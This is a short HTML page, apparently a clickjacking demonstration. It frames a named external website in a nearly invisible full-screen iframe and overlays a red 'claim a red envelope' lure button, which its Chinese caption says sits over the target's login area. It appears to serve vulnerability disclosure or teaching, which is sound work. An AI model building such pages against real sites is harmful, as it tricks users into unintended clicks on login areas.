<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
.desc{
    width:100%;
    padding:16px;
    font-size:15px;
    background:#fff;
    position:relative;
    z-index:999;
}
iframe{
    position:absolute;
    top:60px;
    left:0;
    width:100vw;
    height:calc(100vh - 60px);
    opacity:0.1;
    z-index:1;
    border:none;
}
.fake-btn{
    position:absolute;
    top:420px;
    left:50%;
    transform: translateX(-50%);
    width:242px;
    height:50px;
    background:#e62626;
    color:#fff;
    font-size:20px;
    text-align:center;
    line-height:50px;
    z-index:99;
    cursor:pointer;
    border-radius: 6px;
}
</style>
</head>
<body>
<div class="desc">点击劫持漏洞演示：虚假诱导按钮覆盖目标系统登录区域</div>
<iframe src="https://www.sptesyun.com"></iframe>
<div class="fake-btn">🧧 点击领取红包</div>
</body>
</html>
